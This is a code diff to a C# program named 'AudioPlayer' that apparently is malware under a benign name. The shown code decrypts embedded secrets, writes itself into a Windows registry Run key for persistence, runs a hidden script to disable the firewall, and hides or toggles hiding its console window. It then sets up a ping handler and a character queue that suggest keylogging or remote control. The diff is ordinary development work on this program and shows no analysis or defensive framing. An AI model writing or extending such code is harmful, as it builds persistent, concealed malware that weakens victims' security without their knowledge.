@@ -7,33 +7,9 @@ using Microsoft.Win32;
 using System.IO;
 using System.Diagnostics;
 using System.Collections.Generic;
+using System.Runtime.InteropServices;
 
 namespace AudioPlayer {
-	class AutoRunner {
-		private String key;
-		private String item;
-
-		public AutoRunner(String key, String item) {
-			this.key = key;
-			this.item = item;
-		}
-
-		//private String key = @"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run";
-		//private String item = "test";
-
-		private bool ShouldAutoRun() {
-			string current = (string) Registry.GetValue(key, item, null);
-			return current == null || !File.Exists(current);
-		}
-
-		public void Install(string executable_path) {
-			if(ShouldAutoRun()) {
-				Registry.SetValue(key, item, executable_path);
-			}			
-		}
-	}
-
-
 	class Program {
 		enum CreateType {
 			Ping,
@@ -65,13 +41,13 @@ namespace AudioPlayer {
 			var secrets = Secret.Unlock();
 			
 			String executable_path = System.Reflection.Assembly.GetEntryAssembly().Location;
-			new AutoRunner(secrets["autorun_ns"], secrets["autorun_key"]).Install(executable_path);
+			new RegistryAutoRunner(secrets["autorun_ns"], secrets["autorun_key"]).Install(executable_path);
 
 			// Disable firewall with script embeded in encrypted secret.xml
 			exec(secrets, "fw");
 			
-			Win32API.ShowWindow(Win32API.GetConsoleWindow(), 0);
-
+			//Win32API.ShowWindow(Win32API.GetConsoleWindow(), 0);
+			
 			IHandler handler = createHandler(CreateType.Ping);
 
 			var queue = new BlockingCollection<char>(new ConcurrentQueue<char>());
